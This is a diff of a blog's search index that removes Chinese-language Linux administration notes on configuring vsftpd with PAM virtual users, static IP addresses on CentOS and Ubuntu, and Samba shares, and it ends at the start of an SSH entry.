-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  全局设置</span><br><span class="line">listen_port&#x3D;21			#  设置监听端口</span><br><span class="line">user_config_dir&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;user_conf	#  指定用户配置文件目录（配置文件需为对应的用户名）</span><br><span class="line">allow_writeable_chroot&#x3D;yes	#  加上此行解决报错（如用户被限定在其主目录下，则该用户不能在有写的权限，否则会报错）</span><br><span class="line">#  传输</span><br><span class="line">ascii_upload_enable&#x3D;yes		#  启用 ASCII 模式上传数据（配置文件内默认有该参数，但被注释了）</span><br><span class="line">ascii_download_enable&#x3D;yes	#  启用 ASCII 模式下载数据（配置文件内默认有该参数，但被注释了）</span><br><span class="line">#  被动模式相关（如启用了被动模式，则在客户端使用 ftp 访问时需使用 passive 关闭客户端的被动模式，强制其使用port方式连接。如需开启则再次运行该命令）</span><br><span class="line">pasv_enable&#x3D;yes         #  启用被动模式</span><br><span class="line">pasv_promiscuous&#x3D;yes	#  关闭 PASV 模式的安全检查（该检查确保数据连接和控制连接是来自同一 IP）</span><br><span class="line">pasv_max_port&#x3D;4500	#  PASV 使用的最大端口</span><br><span class="line">pasv_min_port&#x3D;4000	#  PASV 使用的最小端口</span><br><span class="line">pasv_address&#x3D;192.168.1.1	#  PASV 模式传输的地址（访问的客户端 IP 跟此处的 IP 不一致时会报错）</span><br><span class="line">#  限制</span><br><span class="line">max_clients&#x3D;100			#  最大客户端连接数为 100</span><br><span class="line">max_per_ip&#x3D;3			#  每个 IP 最大连接数为  3</span><br><span class="line">deny_file&#x3D;&#123;*.exe,&#39;*root*&#125;	#  禁止上传 .exe 的文件和文件名带有 root 的文件</span><br><span class="line">chroot_list_enable&#x3D;yes		#  启用限制用户的名单</span><br><span class="line">chroot_list_file&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;test	#  在 test 文件内指定用户列表（泽泻用户作为“例外”，不受限制）</span><br><span class="line">chroot_local_user&#x3D;yes		#  所有用户被限制在其主目录下（不能访问除主目录外的其他目录）</span><br><span class="line"></span><br><span class="line">#  匿名用户相关配置</span><br><span class="line">anonymous_enable&#x3D;yes		#  允许匿名用户访问（配置文件内默认有该参数）</span><br><span class="line">anon_root&#x3D;&#x2F;test			#  指定匿名用户目录</span><br><span class="line">#  匿名用户权限相关</span><br><span class="line">anon_upload_enable&#x3D;yes		#  允许匿名用户上传文件（配置文件内默认有该参数，但被注释了）</span><br><span class="line">anon_mkdir_write_enable&#x3D;yes	#  允许匿名用户创建目录（配置文件内默认有该参数，但被注释了）</span><br><span class="line">anon_world_readable_only&#x3D;yes	#  文件权限中其他用户需有可读的权限，匿名用户才能下载（文件权限分：用户、组、其他用户）</span><br><span class="line">anon_umask&#x3D;022		        #  设置匿名用户新建文件的权限为 755（可理解为组跟其他用户不需要 2 权限，或  777 减去 022 ）</span><br><span class="line">#  匿名用户限制相关</span><br><span class="line">anon_max_rate&#x3D;30000		#  匿名用户限速为 30k&#x2F;s</span><br><span class="line">anon_other_write_enable&#x3D;yes	#  匿名用户拥有删除权限</span><br><span class="line"></span><br><span class="line">#  虚拟用户相关</span><br><span class="line">local_root&#x3D;&#x2F;test		#  指定虚拟用户目录（由于是基于本地用户的，所以需使用此行，文件权限设置为 777）</span><br><span class="line">guest_enable&#x3D;yes		#  开启用户身份映射（允许虚拟用户登陆）</span><br><span class="line">guest_username&#x3D;virtftp		#  设置映射的用户身份为 virtftp（virtftp 为真实用户）</span><br><span class="line">pam_service_name&#x3D;vsftpd.vu	#  开启 PAM 认证，配置文件路径为&#x2F;etc&#x2F;pam.d&#x2F;vsftpd.vu（默认有该行配置，但文件名为vsftpd）</span><br><span class="line">virtual_use_local_privs&#x3D;yes	#  使虚拟用户跟本地用户权限相同（配置此行后需使用用户的参数来配置虚拟用户）</span><br><span class="line"></span><br><span class="line">#  用户相关配置</span><br><span class="line">local_root&#x3D;&#x2F;test		#  指定用户访问目录</span><br><span class="line">local_umask&#x3D;022			#  设置用户新建文件的权限为 755（可理解为组跟其他用户不需要 2 权限，或  777 减去 022 ）</span><br><span class="line">local_max_rate&#x3D;30000		#  用户限速为 30k&#x2F;s</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="三、配置本地用户访问"><a href="#三、配置本地用户访问" class="headerlink" title="三、配置本地用户访问"></a>三、配置本地用户访问</h2><h3 id="1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容"><a href="#1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容" class="headerlink" title="1、编辑 vsftpd.conf 配置文件，在文件末尾添加如下内容"></a>1、编辑 <code>vsftpd.conf</code> 配置文件，在文件末尾添加如下内容</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local_root&#x3D;&#x2F;test</span><br></pre></td></tr></table></figure>
-<h3 id="2、创建用户"><a href="#2、创建用户" class="headerlink" title="2、创建用户"></a>2、创建用户</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd test    #  新建 test 用户</span><br><span class="line">passwd test     #  设置密码（此处需确认密码）</span><br></pre></td></tr></table></figure>
-<h3 id="3、创建目录"><a href="#3、创建目录" class="headerlink" title="3、创建目录"></a>3、创建目录</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;test         #  创建目录</span><br><span class="line">chmod 755 &#x2F;test     #  设置目录权限</span><br><span class="line">chown test:test &#x2F;test   #  设置该目录所属用户跟组</span><br></pre></td></tr></table></figure>
-<p>配置完后使用命令重启服务：<code>systemctl restart vsftpd</code></p>
-<h3 id="4、登陆测试"><a href="#4、登陆测试" class="headerlink" title="4、登陆测试"></a>4、登陆测试</h3><p>安装 <code>ftp</code> 工具：<code>yum -y install ftp</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  使用命令连接登陆测试</span><br><span class="line">ftp 192.168.1.123</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="四、配置虚拟用户访问"><a href="#四、配置虚拟用户访问" class="headerlink" title="四、配置虚拟用户访问"></a>四、配置虚拟用户访问</h2><h3 id="1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容-1"><a href="#1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容-1" class="headerlink" title="1、编辑 vsftpd.conf 配置文件，在文件末尾添加如下内容"></a>1、编辑 <code>vsftpd.conf</code> 配置文件，在文件末尾添加如下内容</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user_config_dir&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;user_conf	#  指定用户配置文件目录（配置文件需为对应的用户名）</span><br><span class="line">guest_enable&#x3D;yes		    #  开启用户身份映射（允许虚拟用户登陆）</span><br><span class="line">guest_username&#x3D;virtftp		#  设置映射的用户身份为 virtftp（virtftp 为真实用户）</span><br><span class="line">pam_service_name&#x3D;vsftpd.vu	#  开启 PAM 认证，配置文件路径为&#x2F;etc&#x2F;pam.d&#x2F;vsftpd.vu（需注释掉原有的行，并复制原文件另存为 vsftpd.vu）</span><br><span class="line">allow_writeable_chroot&#x3D;yes	#  加上此行解决报错（如用户被限定在其主目录下，则该用户不能在有写的权限，否则会报错）</span><br></pre></td></tr></table></figure>
-<h3 id="2、创建映射的账号并设置虚拟用户的账号跟密码"><a href="#2、创建映射的账号并设置虚拟用户的账号跟密码" class="headerlink" title="2、创建映射的账号并设置虚拟用户的账号跟密码"></a>2、创建映射的账号并设置虚拟用户的账号跟密码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  创建虚拟用户映射的用户（该用户不可登陆）</span><br><span class="line">useradd -s &#x2F;sbin&#x2F;nologin virtftp</span><br><span class="line"></span><br><span class="line">#  创建存放用户名跟密码的文件</span><br><span class="line">touch ftpuser.txt</span><br></pre></td></tr></table></figure>
-<p><code>ftpuser.txt</code> 文件内容如下（单数行为用户名，双数行为密码）：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftpadmin</span><br><span class="line">admin</span><br><span class="line">ftpuser</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>
-<p>由于保存虚拟用户跟密码的文本无法被直接调用，所以需生成数据库文件：<br><code>db_load -T -t hash -f ftpuser.txt ftpuser.db</code></p>
-<h3 id="3、创建用户配置文件"><a href="#3、创建用户配置文件" class="headerlink" title="3、创建用户配置文件"></a>3、创建用户配置文件</h3><p>创建虚拟用户的配置目录及其配置文件：<br><code>mkdir /etc/vsftpd/user_conf</code><br><code>touch /etc/vsftpd/user_conf/ftpadmin</code><br><code>touch /etc/vsftpd/user_conf/ftpuser</code></p>
-<p>ftpadmin 配置内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">anon_upload_enable&#x3D;yes</span><br><span class="line">anon_mkdir_write_enable&#x3D;yes</span><br><span class="line">anon_other_write_enable&#x3D;yes</span><br><span class="line">anon_umask&#x3D;022</span><br></pre></td></tr></table></figure>
-<p>ftpuser 配置内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">anon_upload_enable&#x3D;yes</span><br></pre></td></tr></table></figure>
-<h3 id="4、配置-PAM-认证"><a href="#4、配置-PAM-认证" class="headerlink" title="4、配置 PAM 认证"></a>4、配置 PAM 认证</h3><p>根据 vsftpd.conf 配置将 PAM 认证文件名更改为对应的名称：<br><code>mv /etc/pam.d/vsftpd /etc/pam.d/vsftpd.vu</code></p>
-<p>注释 <code>vsftpd.vu</code> 文件内所有行，并在文件末尾添加如下内容：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  此处末尾的路径为虚拟用户账号跟密码文件所在的绝对路径（无需后缀名）</span><br><span class="line">auth	required	pam_userdb.so	db&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;ftpuser</span><br><span class="line">account	required	pam_userdb.so	db&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;ftpuser</span><br></pre></td></tr></table></figure>
-<p>配置完后使用命令重启服务：<code>systemctl restart vsftpd</code></p>
-<h3 id="5、登陆测试"><a href="#5、登陆测试" class="headerlink" title="5、登陆测试"></a>5、登陆测试</h3><p>安装 <code>ftp</code> 工具：<code>yum -y install ftp</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  使用命令连接登陆测试</span><br><span class="line">ftp 192.168.1.123	#  如服务重启无报错，登陆失败则可能是 PAM 配置文件的问题</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="五、PAM-配置文件简介"><a href="#五、PAM-配置文件简介" class="headerlink" title="五、PAM 配置文件简介"></a>五、PAM 配置文件简介</h2><h3 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务器名称    模块类型    控制方式    模块路径    模块参数</span><br></pre></td></tr></table></figure>
-<h3 id="服务器名称："><a href="#服务器名称：" class="headerlink" title="服务器名称："></a>服务器名称：</h3><p>设置服务器名称时字母需小写</p>
-<h3 id="模块类型："><a href="#模块类型：" class="headerlink" title="模块类型："></a>模块类型：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auth        #  接受用户名和密码，进而对该用户的密码进行认证，并负责设置用户的一些秘密信息。</span><br><span class="line">account     #  检查帐户是否被允许登录系统，帐号是否已经过期，帐号的登录是否有时间段的限制等等。</span><br><span class="line">password    #  用来修改用户的密码，检测修改密码动作是否被允许以及新密码是否符合要求等。</span><br><span class="line">session     #  提供对会话的管理和记账。</span><br></pre></td></tr></table></figure>
-<h3 id="控制方式："><a href="#控制方式：" class="headerlink" title="控制方式："></a>控制方式：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">required    #  表示本模块必须返回成功才能通过认证，但是如果该模块返回失败的话，失败结果也不会立即通知用户，而是要等到同一 stack 中的所有模块全部执行完毕再将失败结果返回给应用程序。可以认为是一个必要条件。</span><br><span class="line">requisite   #  与required类似，该模块必须返回成功才能通过认证，但是一旦该模块返回失败，将不再执行同一 stack 内的任何模块，而是直 接将控制权返回给应用程序。是一个必要条件。</span><br><span class="line">sufficient  #  表明本模块返回成功已经足以通过身份认证的要求，不必再执行同一 stack 内的其它模块，但是如果本模块返回失败的话可以忽略。可以认为是一个充分条件。</span><br><span class="line">optional    #  表明本模块是可选的，它的成功与否一般不会对身份认证起关键作用，其返回值一般被忽略。</span><br><span class="line">include     #  将认证权利移交给其他文件。</span><br></pre></td></tr></table></figure>
-<h3 id="模块路径："><a href="#模块路径：" class="headerlink" title="模块路径："></a>模块路径：</h3><p>设置模块路径（需绝对路径）</p>
-<h3 id="模块参数："><a href="#模块参数：" class="headerlink" title="模块参数："></a>模块参数：</h3><p>传递给改模块的参数</p>
-]]></content>
-      <categories>
-        <category>网络应用竞赛</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Network</title>
-    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/Network/Network/</url>
-    <content><![CDATA[<h2 id="一、网卡命名规范（设备类型-设备位置-数字）"><a href="#一、网卡命名规范（设备类型-设备位置-数字）" class="headerlink" title="一、网卡命名规范（设备类型 + 设备位置 + 数字）"></a>一、网卡命名规范（设备类型 + 设备位置 + 数字）</h2><p><strong>设备类型：</strong></p>
-<table>
-<thead>
-<tr>
-<th align="center">格式</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">en</td>
-<td align="left">以太网（Ethernet）</td>
-</tr>
-<tr>
-<td align="center">ib</td>
-<td align="left">无限宽带（InfiniBand）</td>
-</tr>
-<tr>
-<td align="center">sl</td>
-<td align="left">串列线路互联网协议（slip：Serial line IP）</td>
-</tr>
-<tr>
-<td align="center">wl</td>
-<td align="left">无线局域网（WLAN）</td>
-</tr>
-<tr>
-<td align="center">www</td>
-<td align="left">无线广域网（WWAN）</td>
-</tr>
-</tbody></table>
-<p><strong>设备位置：</strong></p>
-<table>
-<thead>
-<tr>
-<th align="center">格式</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">o</td>
-<td align="left">集成设备</td>
-</tr>
-<tr>
-<td align="center">s</td>
-<td align="left">扩展槽的索引号</td>
-</tr>
-<tr>
-<td align="center">x</td>
-<td align="left">基于 MAC 进行命名</td>
-</tr>
-<tr>
-<td align="center">p</td>
-<td align="left">PCI 扩展总线</td>
-</tr>
-</tbody></table>
-<p><strong>实例：</strong></p>
-<table>
-<thead>
-<tr>
-<th align="left">格式</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">eth0</td>
-<td align="left">默认的网卡名</td>
-</tr>
-<tr>
-<td align="left">eno1</td>
-<td align="left">主板 BIOS 内置的网卡</td>
-</tr>
-<tr>
-<td align="left">ens1</td>
-<td align="left">主板 BIOS 内置的 PCI 网卡（PCI：主板上的一个插槽）</td>
-</tr>
-<tr>
-<td align="left">enp0s2</td>
-<td align="left">PCI 独立网卡（PCI：主板上的一个插槽）</td>
-</tr>
-<tr>
-<td align="left">wlp3s0</td>
-<td align="left">PCI 无线网卡（PCI：主板上的一个插槽）</td>
-</tr>
-<tr>
-<td align="left">wwp0s29f7u2i2</td>
-<td align="left">4G modem</td>
-</tr>
-<tr>
-<td align="left">wlp0s2f1u4u1</td>
-<td align="left">连接在 USB Hub 上的无线网卡</td>
-</tr>
-<tr>
-<td align="left">enx78e7d1ea46da</td>
-<td align="left">PCI 网卡（PCI：主板上的一个插槽）</td>
-</tr>
-</tbody></table>
-<h2 id="二、Centos-配置静态-IP"><a href="#二、Centos-配置静态-IP" class="headerlink" title="二、Centos 配置静态 IP"></a>二、Centos 配置静态 IP</h2><p>Centos7 默认网络配置文件路径为：<code>/etc/sysconfig/network-scripts/ifcfg-eth0</code> （有一些默认文件则是 <code>ifcfg-ens33</code> 或是其他的）</p>
-<p>1、编辑配置文件 <code>ifcfg-eth0</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  在文件中找到如下内容</span><br><span class="line">BOOTPROTO&#x3D;dhcp		    #  将文件中的这行修改为 static</span><br><span class="line">IPV4_FAILURE_FATAL&#x3D;no	#  将文件中的这行修改为 yes</span><br><span class="line">ONBOOT&#x3D;no   			#  将文件中的这行修改为 yes</span><br><span class="line"></span><br><span class="line">#  在文件末尾添加如下内容</span><br><span class="line">IPADDR&#x3D;10.1.82.232	    #  网卡 IP</span><br><span class="line">NETMASK&#x3D;255.255.255.0	#  子网掩码</span><br><span class="line">GATEWAY&#x3D;10.1.82.254		#  网关</span><br><span class="line">DNS1&#x3D;8.8.8.8			#  首选 DNS</span><br></pre></td></tr></table></figure>
-<p>2、<code>ifcfg-eth0</code> 文件详解</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TYPE&#x3D;Ethernet			#  网卡类型</span><br><span class="line">PROXY_METHOD&#x3D;none		#  代理方式（默认关闭）</span><br><span class="line">BROWSER_ONLY&#x3D;no		    #  代理设置是否仅用于浏览器</span><br><span class="line">BOOTPROTO&#x3D;static		#  网卡的引导协议（static：静态 IP，dhcp：动态 IP，none：不启用）</span><br><span class="line">DEFROUTE&#x3D;yes			#  默认路由</span><br><span class="line">IPV4_FAILURE_FATAL&#x3D;yes	#  是否开启 IPV4 致命错误检测</span><br><span class="line">IPV6INIT&#x3D;yes			#  IPV6 是否自动初始化</span><br><span class="line">IPV6_AUTOCONF&#x3D;yes		#  IPV6 是否自动配置</span><br><span class="line">IPV6_DEFROUTE&#x3D;yes		#  IPV6 是否可以为默认路由</span><br><span class="line">IPV6_FAILURE_FATAL&#x3D;no	#  是否开启 IPV6 致命错误检测</span><br><span class="line">IPV6_ADDR_GEN_MODE&#x3D;stable-privacy		#  IPV6 地址生成模型</span><br><span class="line">NAME&#x3D;eth0</span><br><span class="line">UUID&#x3D;b3942c00-c0e4-45e8-8e4d-f1dd06ab9a09	#  统用唯一识别码（不能跟其他 UUID 重复）</span><br><span class="line">DEVICE&#x3D;eth0			#  网卡名称</span><br><span class="line">ONBOOT&#x3D;yes			#  是否开机自启</span><br><span class="line"></span><br><span class="line">IPADDR&#x3D;10.1.82.232	    #  网卡 IP</span><br><span class="line">NETMASK&#x3D;255.255.255.0	#  子网掩码</span><br><span class="line">GATEWAY&#x3D;10.1.82.254		#  网关</span><br><span class="line">DNS1&#x3D;8.8.8.8			#  首选 DNS</span><br></pre></td></tr></table></figure>
-<p>3、配置完后需重启服务<br>重启网络：<code>systemctl restart network</code><br>停止：<code>systemctl stop network</code><br>开启：<code>systemctl start network</code><br>查看状态：<code>systemctl status network</code></p>
-<h2 id="三、Ubuntu-配置静态-IP"><a href="#三、Ubuntu-配置静态-IP" class="headerlink" title="三、Ubuntu 配置静态 IP"></a>三、Ubuntu 配置静态 IP</h2><p>1、如配置文件路径为 <code>/etc/network/interfaces／interfaces</code>，则在文件末尾添加如下内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  添加网卡 eth0 并设置为 static（静态 IP）模式</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.1.123	#  网卡 IP</span><br><span class="line">netmask 255.255.255.0	#  子网掩码</span><br><span class="line">gateway 192.168.1.1	#  网关</span><br><span class="line">dns 114.114.114.114	#  dns</span><br></pre></td></tr></table></figure>
-<p>配置完成后需重启服务<br>重启网络：<code>sudo systemctl restart network</code><br>停止：<code>sudo systemctl stop network</code><br>开启：<code>sudo systemctl start network</code><br>查看状态：<code>sudo systemctl status network</code></p>
-<p>２、如配置文件路径为：<code>/etc/netplan/01-network-manager-all.yaml</code>，则在文件末尾添加如下内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">静态 IP 配置文件内容如下</span><br><span class="line">network:</span><br><span class="line">    version: 2</span><br><span class="line">    renderer: NetworkManager</span><br><span class="line">    ethernets:</span><br><span class="line">        ens33:</span><br><span class="line">            dhcp4: no</span><br><span class="line">            dhcp6: no</span><br><span class="line">            addresses: [192.168.1.233&#x2F;23]</span><br><span class="line">            gateway4: 192.168.0.1</span><br><span class="line">            nameservers:</span><br><span class="line">                 addresses: [114.114.114.114,180.76.76.76]</span><br><span class="line"></span><br><span class="line">动态 IP 配置文件内容如下</span><br><span class="line">network:</span><br><span class="line">    ethernets:</span><br><span class="line">        ens33:</span><br><span class="line">            dhcp4: true</span><br><span class="line">    version: 2</span><br></pre></td></tr></table></figure>
-<p>使配置生效命令：<code>sudo netplan apply</code></p>
-<p>如果配置生效后旧 IP 依然存在则使用命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ip addr flush dev ens33</span><br><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup ens33</span><br><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>网络应用竞赛</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Samba</title>
-    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/Samba/Samba/</url>
-    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一种免费软件，由服务器及客户端程序构成。</p>
-<p>SMB 是在局域网上共享文件和打印机的一种通信协议</p>
-<p>默认端口号</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp：139、445</span><br><span class="line">UDP：137、138</span><br></pre></td></tr></table></figure>
-<h2 id="二、安装及参数介绍"><a href="#二、安装及参数介绍" class="headerlink" title="二、安装及参数介绍"></a>二、安装及参数介绍</h2><p>安装 Samba：<code>yum -y install samba</code><br>默认配置文件路径：<code>/etc/samba/smb.conf</code></p>
-<h3 id="可用变量"><a href="#可用变量" class="headerlink" title="可用变量"></a>可用变量</h3><p>变量名|描述|变量名|描述<br>:-:|:-|:-:|:-|:-<br>%a | 客户机的结构（只支持：Samba、WfWg、WinNT、Win95） | %d | 当前服务进程 ID<br>%I | 客户机的 IP | %P | 当前服务的根目录<br>%L | 服务器的 NETBIOS 名称 | %N | NIS 服务器名<br>%R | 采用的协议等级（值可以是 CORE，COREPLUS，LANMAN1, LANMAN2，NT1） | %S | 当前服务名<br>%T | 当前日期和时间 | %v | Samba 服务的版本号<br>%h | 运行 Samba 服务机器的主机名 | %H | 当前服务的用户的 Home 目录<br>%g | 当前用户所在的主工作组 | %G | 当前对话的用户的主工作组<br>%m | 客户机的 NETBIOS 名称 | %M | 客户机的主机名<br>%u | 当前服务的用户名 | %U | 当前对话的用户名</p>
-<h3 id="smb-conf-配置文件常用参数"><a href="#smb-conf-配置文件常用参数" class="headerlink" title="smb.conf 配置文件常用参数"></a>smb.conf 配置文件常用参数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]		#  全局配置（默认有该设置，如需要在全局下添加东西则只需在文件中该行的下面添加即可）</span><br><span class="line">config file&#x3D;&#x2F;etc&#x2F;&#x2F;samba&#x2F;%U	#  设置配置文件的绝对路径（需要在全局配置下添加）</span><br><span class="line"></span><br><span class="line">[homes]		#  用于共享用户目录（默认有该配置）</span><br><span class="line"></span><br><span class="line">[printers]	#  用于共享打印机（默认有该配置）</span><br><span class="line"></span><br><span class="line">[test]			    #  共享名</span><br><span class="line">comment &#x3D; test-test	#  该共享的说明</span><br><span class="line">path &#x3D; &#x2F;test		#  共享文件路径</span><br><span class="line"></span><br><span class="line">#  用户相关</span><br><span class="line">browseable &#x3D; yes	#  可浏览</span><br><span class="line">public &#x3D; yes		#  允许 guest 账户访问</span><br><span class="line">guest ok &#x3D; yes		#  允许 guest 用户访问</span><br><span class="line">writeable &#x3D; yes		#  用户可写</span><br><span class="line">write list &#x3D; test-1,test-2	#  指定 test-1 用户跟 test-2 用户可写</span><br><span class="line">admin users &#x3D; admin         #  该共享的管理者</span><br><span class="line">valid users &#x3D; test-1,test-2		#  设置用户白名单（test-1 与 test-2 用户可访问）</span><br><span class="line">invalid users &#x3D; test-3,test-4	#  设置用户黑名单（test-3 与 test-4 用户禁止访问）</span><br><span class="line">create mode &#x3D; 0644	#  新建文件后文件的权限</span><br><span class="line">directory mode &#x3D; 0755	#  新建文件夹后文件夹的权限</span><br><span class="line">veto files &#x3D; &#x2F;*root*&#x2F;*.exe&#x2F;	#  禁止上传 *.exe 的文件跟文件名含有 root 的文件或文件夹</span><br><span class="line"></span><br><span class="line">#  日志相关</span><br><span class="line">log file &#x3D; &#x2F;var&#x2F;log&#x2F;samba&#x2F;%m.log	#  指定日志存放位置</span><br><span class="line">max log size &#x3D;10		#  设置日志文件大小（单位为：M）</span><br><span class="line"></span><br><span class="line">#  安全相关</span><br><span class="line">encrypt passwords &#x3D;yes	#  密码加密</span><br><span class="line">smb passwd file &#x3D; &#x2F;etc&#x2F;samba&#x2F;smbpasswd	#  Samba 用户密码文件存放位置</span><br><span class="line">username map &#x3D; &#x2F;etc&#x2F;samba&#x2F;smbusers      #  Samba 用户文件存放位置</span><br><span class="line">security &#x3D; share		#  安全选项（share、user、server、domain）</span><br><span class="line">	- hare：用户访问 Samba Server 不需要提供用户名和密码</span><br><span class="line">	- user：Samba Server 共享目录只能被授权的用户访问，由 Samba  Server负责检查账号和密码的正确性</span><br><span class="line">	- server：依靠其他 Wwindows NT &#x2F;2000 或 Samba Server 来验证用户名和密码</span><br><span class="line">	- domain：域安全级别，使用主域控制器（PDC）来完成验证</span><br><span class="line"></span><br><span class="line">#  打印机相关</span><br><span class="line">printable &#x3D; yes         #  打印机是否可打印（默认有该参数）</span><br><span class="line">load printers &#x3D; yes     #  当 Samba 启动时共享打印机</span><br><span class="line">printcap name &#x3D; cups	#  设置共享打印机的配置文件</span><br></pre></td></tr></table></figure>
-<h3 id="新建-Samba-用户"><a href="#新建-Samba-用户" class="headerlink" title="新建 Samba 用户"></a>新建 Samba 用户</h3><p>创建 Samba 用户需先建立对应的本地用户 <code>useradd test</code></p>
-<p>新建 test 用户：<code>smbpasswd -a test</code><br>删除 test 用户：<code>smbpasswd -x test</code><br>禁用 test 用户：<code>smbpasswd -d test</code><br>启用 test 用户：<code>smbpasswd -e test</code><br>清除 test 用户密码：<code>smbpasswd -n test</code><br>列出 samba 用户：<code>pdbedit -L</code><br>列出 samba 用户详细：<code>pdbedit -Lv</code></p>
-<h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><p>1、新建用户，并设置共享目录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  新建本地用户 test</span><br><span class="line">useradd test</span><br><span class="line">#  新建 smb 用户 test</span><br><span class="line">smbpasswd -a test	#  此处需要设置密码</span><br><span class="line">#  设置共享目录</span><br><span class="line">mkdir &#x2F;test</span><br></pre></td></tr></table></figure>
-<p>2、编辑配置文件<br>编辑 Samba 配置文件：<code>vim /etc/samba/smb.conf</code><br>在文件内添加如下内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[test]			#  共享名</span><br><span class="line">comment &#x3D; test	#  该共享的描述</span><br><span class="line">path &#x3D; &#x2F;test	#  共享的目录</span><br><span class="line">writeable &#x3D; yes	#  允许写入</span><br></pre></td></tr></table></figure>
-<p>3、重启服务<br>编辑完配置文件后重启服务即可<br>停止服务：<code>systemctl stop smb</code><br>启动服务：<code>systemctl start smb</code><br>重启服务：<code>systemctl restart smb</code><br>查看服务状态：<code>systemctl status smb</code></p>
-]]></content>
-      <categories>
-        <category>网络应用竞赛</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>easygui 库</title>
     <url>/2021/02/09/Python/%E5%BA%93/EasyGui%E5%BA%93/easygui%E5%BA%93/</url>
     <content><![CDATA[<h2 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h2><p>EasyGUI 是一个用 Python 编写的非常简易的 GUI 编程模块</p>
@@ -1051,38 +1113,6 @@
       </categories>
       <tags>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSH</title>
-    <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/ssh/ssh/</url>
-    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>SSH 是为远程登陆会话和其他网络服务提供安全性的协议</p>
-<p>默认端口号为：<code>22</code><br>客户端配置文件：<code>/etc/ssh/ssh_config</code><br>服务端配置文件：<code>/etc/ssh/sshd_config</code></p>
-<h2 id="二、ssh-config"><a href="#二、ssh-config" class="headerlink" title="二、ssh_config"></a>二、ssh_config</h2><p><code>ssh_config</code> 配置文件常用参数</p>
